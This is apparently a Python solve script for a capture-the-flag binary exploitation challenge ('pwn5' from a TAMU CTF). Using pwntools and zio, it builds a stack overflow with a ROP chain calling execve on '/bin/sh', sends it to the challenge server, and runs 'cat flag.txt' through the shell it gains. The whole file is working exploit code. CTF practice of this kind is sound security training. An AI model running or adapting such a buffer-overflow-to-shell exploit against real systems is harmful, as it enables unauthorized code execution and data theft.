# https://ctftime.org/task/5401
from pwn import *
from zio import *
import re

flag_pattern = r'gigem{.+?}'
context.clear(arch='i386')
context.kernel = 'amd64'
e = ELF('./pwn5')
rop = ROP(e)
binsh = e.symbols['first_name']
rop.execve(binsh, 0, 0)

off_dest = -0x1c
off_ret = 4
junk = 'a'

payload = (off_ret - off_dest) * junk + str(rop)

server = 'pwn.ctf.tamu.edu', 4325
io = zio(server, print_read=False, print_write=False)
io.writeline('/bin/sh')
io.writeline(junk)
io.writeline(junk)
io.writeline('y')
io.writeline('2')
io.writeline(payload)
io.writeline("cat flag.txt")
content = io.read_until_re(flag_pattern)
flag = re.search(flag_pattern, content).group()

with open('flag', 'wb') as f:
	f.write(flag)
